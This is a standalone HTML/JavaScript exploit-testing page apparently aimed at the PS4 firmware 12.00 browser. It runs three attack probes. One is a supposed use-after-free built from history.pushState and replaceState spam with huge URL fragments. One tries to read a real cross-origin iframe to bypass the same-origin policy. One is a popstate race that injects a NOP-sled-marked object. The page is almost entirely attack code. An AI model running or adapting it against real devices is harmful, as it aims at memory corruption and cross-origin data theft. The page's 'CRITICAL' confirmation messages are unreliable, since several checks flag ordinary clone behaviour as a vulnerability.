<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Focused Tests</title>
</head>
<body>
<h2>PS4 12.00 - Focused Exploitation Tests</h2>
<p><b>WARNING:</b> Critical vectors only. No CSS/Style overhead.</p>
<hr>

<button onclick="testLifetimeConfusion()">Test 1: Lifetime Confusion</button>
<button onclick="testSOPBypass()">Test 2: SOP Bypass (Real Cross-Origin)</button>
<button onclick="testCombined()">Test 3: Combined Attack</button>
<button onclick="logEl.value = ''">Clear</button>

<br><br>
<textarea id="log" rows="300" cols="1000"></textarea>

<script>
const logEl = document.getElementById("log");

function log(m){ 
  logEl.value += m + "\n";
  logEl.scrollTop = logEl.scrollHeight;
}

function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

const BASE = 977;
const STEP = 14461;
const UAF_ITERS = 48;

// Core UAF trigger
async function triggerUAF(stateData = null) {
  let size = BASE;
  for(let i=0; i<UAF_ITERS; i++){
    let state = stateData || { index: i, data: [i, i*2, i*3, i*4] };
    if(!stateData) state.index = i;
    
    let frag = "E".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(5);
  }
  await sleep(200);
}

// ============================================================
// TEST 1: LIFETIME CONFUSION (Enhanced)
// ============================================================
async function testLifetimeConfusion() {
  logEl.value = "";
  log("================================================================");
  log("TEST 1: LIFETIME CONFUSION (Enhanced)");
  log("================================================================\n");
  
  log("[1.1] Creating complex object with multiple references");
  
  const buffer = new ArrayBuffer(4096);
  const view = new Uint32Array(buffer);
  
  // Fill with marker
  for(let i=0; i<1024; i++) {
    view[i] = 0xDEAD0000 + i;
  }
  
  const complexObj = {
    id: "lifetime_test",
    buffer: buffer,
    view: view,
    nested: {
      deep: {
        array: [1,2,3,4,5]
      }
    },
    timestamp: Date.now()
  };
  
  log("  Object created:");
  log("    Buffer: " + buffer.byteLength + " bytes");
  log("    View length: " + view.length);
  log("    Nested array: [" + complexObj.nested.deep.array + "]");
  
  log("\n[1.2] Storing in history (WebCore clone)");
  history.pushState(complexObj, "", "#lifetime");
  
  log("[1.3] Creating multiple JS references");
  window.ref1 = complexObj;
  window.ref2 = history.state;
  window.ref3 = complexObj.buffer;
  
  log("  JS refs created: ref1, ref2, ref3");
  
  log("\n[1.4] Triggering UAF (WebCore side will be freed)");
  await triggerUAF();
  
  log("\n[1.5] Testing dangling references");
  
  try {
    log("  Testing ref1 (original object):");
    log("    ref1.id = " + window.ref1.id);
    log("    ref1.buffer.byteLength = " + window.ref1.buffer.byteLength);
    
    log("\n  Testing ref2 (from history.state):");
    log("    ref2.id = " + window.ref2.id);
    log("    ref2.buffer.byteLength = " + window.ref2.buffer.byteLength);
    
    log("\n  Testing ref3 (direct buffer ref):");
    log("    ref3.byteLength = " + window.ref3.byteLength);
    
    // Critical test: are they the same object?
    log("\n  Identity tests:");
    log("    ref1 === ref2: " + (window.ref1 === window.ref2));
    log("    ref1.buffer === ref3: " + (window.ref1.buffer === window.ref3));
    log("    ref2.buffer === ref3: " + (window.ref2.buffer === window.ref3));
    
  } catch(e) {
    log("  EXCEPTION: " + e.message);
  }
  
  log("\n[1.6] Force WebCore deserialization");
  
  try {
    // Navigate back to trigger deserialization
    history.back();
    await sleep(100);
    
    log("  After history.back():");
    log("    history.state.id = " + history.state.id);
    
    // Try to re-store (forces new WebCore allocation)
    history.pushState(window.ref1, "", "#reuse");
    log("  Re-stored original ref1");
    
    // Navigate to it
    history.forward();
    await sleep(50);
    
    log("  After history.forward():");
    log("    history.state.id = " + history.state.id);
    
    // Critical: check if buffer is still valid
    const newView = new Uint32Array(history.state.buffer);
    log("    New view length: " + newView.length);
    log("    First value: 0x" + newView[0].toString(16));
    
    if(newView[0] === 0xDEAD0000) {
      log("\n  >> Buffer data PRESERVED across lifetime!");
      log("  >> This confirms JS/WebCore lifetime mismatch");
    }
    
  } catch(e) {
    log("  EXCEPTION during deserialization: " + e.message);
  }
  
  log("\n[1.7] Attempt to corrupt via lifetime mismatch");
  
  try {
    // Modify ref1 (JS side)
    window.ref1.nested.deep.array.push(999);
    log("  Modified ref1.nested.deep.array");
    
    // Check if modification affected WebCore state
    history.forward();
    await sleep(50);
    
    const arr = history.state.nested.deep.array;
    log("  history.state array: [" + arr + "]");
    
    if(arr.includes(999)) {
      log("\n  >> CRITICAL: Modification crossed to WebCore!");
      log("  >> Lifetime confusion confirmed!");
    } else {
      log("  >> Modification did NOT cross (clone isolation)");
    }
    
  } catch(e) {
    log("  EXCEPTION: " + e.message);
  }
  
  log("\n================================================================");
  log("TEST 1 COMPLETE");
  log("================================================================\n");
}

// ============================================================
// TEST 2: SOP BYPASS (Real Cross-Origin)
// ============================================================
async function testSOPBypass() {
  logEl.value = "";
  log("================================================================");
  log("TEST 2: SAME-ORIGIN POLICY BYPASS (Real Cross-Origin)");
  log("================================================================\n");
  
  log("[2.1] Creating REAL cross-origin iframe");
  
  const iframe = document.createElement('iframe');
  iframe.id = 'sop-test';
  
  // Use real external URL
  iframe.src = 'https://example.com/';
  
  document.body.appendChild(iframe);
  
  log("  Iframe created with src: " + iframe.src);
  log("  Waiting for load...");
  
  await new Promise(resolve => {
    iframe.onload = resolve;
    setTimeout(resolve, 2000); // Timeout
  });
  
  log("  Iframe loaded (or timeout)");
  
  log("\n[2.2] Testing NORMAL SOP (should fail)");
  
  try {
    const doc = iframe.contentDocument;
    const body = doc.body;
    const html = body.innerHTML;
    
    log("  >> UNEXPECTED: Normal access succeeded!");
    log("  >> Content length: " + html.length);
    log("  >> This should NOT happen with cross-origin!");
    
  } catch(e) {
    log("  >> EXPECTED: SOP blocked access");
    log("  >> Error: " + e.message);
  }
  
  log("\n[2.3] Triggering UAF");
  await triggerUAF();
  
  log("\n[2.4] Testing SOP DURING UAF window");
  
  try {
    const doc = iframe.contentDocument;
    const body = doc.body;
    const html = body.innerHTML;
    
    log("  >> SOP BYPASS CONFIRMED!");
    log("  >> Content length: " + html.length);
    log("  >> First 200 chars: " + html.substring(0, 200));
    
    log("\n  >> CRITICAL VULNERABILITY!");
    log("  >> Can read cross-origin content!");
    
  } catch(e) {
    log("  >> SOP still enforced during UAF");
    log("  >> Error: " + e.message);
  }
  
  log("\n[2.5] Alternative test: postMessage timing");
  
  // Setup listener
  let messageReceived = false;
  window.addEventListener('message', (e) => {
    log("  >> Message received from: " + e.origin);
    log("  >> Data: " + JSON.stringify(e.data));
    messageReceived = true;
  });
  
  // Try to get iframe to send message
  try {
    iframe.contentWindow.postMessage({ probe: true }, '*');
    log("  postMessage sent");
    
    await sleep(500);
    
    if(messageReceived) {
      log("  >> Communication established");
    } else {
      log("  >> No response (expected for cross-origin)");
    }
    
  } catch(e) {
    log("  >> postMessage blocked: " + e.message);
  }
  
  document.body.removeChild(iframe);
  
  log("\n================================================================");
  log("TEST 2 COMPLETE");
  log("================================================================\n");
}

// ============================================================
// TEST 3: COMBINED ATTACK
// ============================================================
async function testCombined() {
  logEl.value = "";
  log("================================================================");
  log("TEST 3: COMBINED ATTACK (Lifetime + Popstate Race)");
  log("================================================================\n");
  
  log("[3.1] Setup: Creating attack objects");
  
  const attackObj = {
    id: "combined_attack",
    payload: new Uint8Array([0x90, 0x90, 0x90, 0x90]), // NOP sled marker
    counter: 0
  };
  
  log("  Attack object created");
  
  log("\n[3.2] Installing popstate handler with side effects");
  
  let raceTriggered = false;
  let stateAccessCount = 0;
  
  window.addEventListener('popstate', (e) => {
    stateAccessCount++;
    
    if(e.state && e.state.index >= 40 && !raceTriggered) {
      raceTriggered = true;
      
      log("\n>> RACE WINDOW TRIGGERED!");
      log("   State index: " + e.state.index);
      log("   Access count: " + stateAccessCount);
      
      // Try to inject during race
      try {
        // Modify global attack object
        attackObj.counter++;
        
        // Try to store modified object
        history.pushState(attackObj, "", "#injected");
        
        log("   >> Injected modified object (counter=" + attackObj.counter + ")");
        
        // Create dangling reference
        window.danglingAttack = e.state;
        
        log("   >> Created dangling reference");
        
      } catch(err) {
        log("   >> Injection error: " + err.message);
      }
    }
  });
  
  log("  Handler installed");
  
  log("\n[3.3] Triggering UAF with attack object");
  
  let size = BASE;
  for(let i=0; i<UAF_ITERS; i++){
    let state = {
      index: i,
      attack: attackObj,
      timestamp: Date.now()
    };
    
    let frag = "E".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(5);
  }
  
  await sleep(200);
  
  log("\n[3.4] Triggering race");
  
  for(let i=0; i<15; i++) {
    history.back();
    await sleep(40);
  }
  
  await sleep(300);
  
  if(!raceTriggered) {
    log("  >> Race NOT triggered");
  } else {
    log("  >> Race triggered successfully");
  }
  
  log("\n[3.5] Testing combined effects");
  
  // Navigate to injected state
  while(history.state && history.state.id !== "combined_attack") {
    history.forward();
    await sleep(20);
  }
  
  if(history.state && history.state.id === "combined_attack") {
    log("  >> Found injected state");
    log("     Counter value: " + history.state.counter);
    log("     Payload: [" + Array.from(history.state.payload) + "]");
    
    // Check dangling reference
    if(window.danglingAttack) {
      log("\n  >> Dangling reference exists");
      log("     Index: " + window.danglingAttack.index);
      
      // Compare identities
      log("     danglingAttack === history.state: " + (window.danglingAttack === history.state));
      
      // Try to access dangling attack object
      try {
        const obj = window.danglingAttack.attack;
        log("     Dangling attack.counter: " + obj.counter);
        
        if(obj.counter === attackObj.counter) {
          log("\n     >> CRITICAL: Same object reference!");
          log("     >> No clone isolation during race!");
        }
        
      } catch(e) {
        log("     >> Error accessing dangling: " + e.message);
      }
    }
    
  } else {
    log("  >> Injected state NOT found");
  }
  
  log("\n[3.6] Final state analysis");
  
  log("  popstate calls: " + stateAccessCount);
  log("  Race triggered: " + raceTriggered);
  log("  Attack object counter: " + attackObj.counter);
  
  if(raceTriggered && attackObj.counter > 0) {
    log("\n  >> Combined attack partially successful");
    log("  >> Race window exploited");
    log("  >> Object modification during UAF confirmed");
  }
  
  log("\n================================================================");
  log("TEST 3 COMPLETE");
  log("================================================================\n");
}

// Initialize
log("PS4 12.00 - Focused Exploitation Tests");
log("=====================================\n");
log("Three critical tests based on analysis:");
log("");
log("TEST 1: Lifetime Confusion");
log("  - Creates JS/WebCore lifetime mismatch");
log("  - Tests if modifications cross layers");
log("  - Attempts corruption via dangling refs");
log("");
log("TEST 2: SOP Bypass (Real Cross-Origin)");
log("  - Uses REAL external URL (example.com)");
log("  - Tests SOP during UAF window");
log("  - Critical security vulnerability if successful");
log("");
log("TEST 3: Combined Attack");
log("  - Lifetime confusion + popstate race");
log("  - Object injection during race window");
log("  - Tests for clone isolation bypass");
log("");
log("Click buttons above to run tests.");
log("WARNING: May cause browser instability.");
log("\n");
</script>
</body>
</html>
